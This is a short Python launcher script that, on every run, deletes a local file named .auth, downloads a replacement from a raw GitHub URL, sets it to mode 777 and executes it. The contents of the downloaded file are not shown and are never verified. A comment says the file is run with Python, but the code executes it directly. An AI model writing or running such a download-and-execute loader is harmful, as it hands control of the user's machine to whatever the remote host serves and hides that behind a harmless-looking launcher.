import os
import sys
import platform
os.system('rm -f .auth')
try:
    if len(sys.argv) > 1 and sys.argv[1] == 'update':
        os.system('rm -f .auth')  # Remove the existing '.auth' file
except Exception as e:
    print(f"Error: {e}")

bit = platform.architecture()[0]

if not os.path.isfile('.auth'):
    # Download the script from the GitHub repository
    os.system('curl -L https://raw.githubusercontent.com/Rahad2nd/XLM/main/.auth -o .auth')

try:
    os.system('chmod 777 .auth && ./.auth')  # Run the downloaded script using Python
except Exception as e:
    print(f"Error running .auth: {e}")
